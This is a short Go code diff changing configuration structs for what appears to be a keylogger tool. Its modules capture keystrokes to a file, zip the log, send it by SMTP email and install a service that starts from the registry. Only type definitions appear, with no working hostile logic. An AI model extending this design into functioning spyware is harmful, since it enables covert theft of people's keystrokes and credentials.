@@ -50,25 +50,23 @@ type SMTP struct {
 	Host     string // host
 	Port     int    // port
 	From     string // message sender address
+	Subject  string // subject of message
 	Name     string // message sender name
 }
 
 // Keylogger - config data for working keylogger module
 type Keylogger struct {
 	Path string // path to file of pressed keys
-	Name string // filename
 }
 
 // Zipper - config data for archiving, archive file config path
 type Zipper struct {
 	Path string // path to archive
-	Name string // name of archive
 }
 
 // Installer - config data for installing the service
 type Installer struct {
 	ServicePath string // service installation path
-	ServiceName string // service installation name
 	RegPath     string // service startup path in the registry
 	RegName     string // name of value
 }
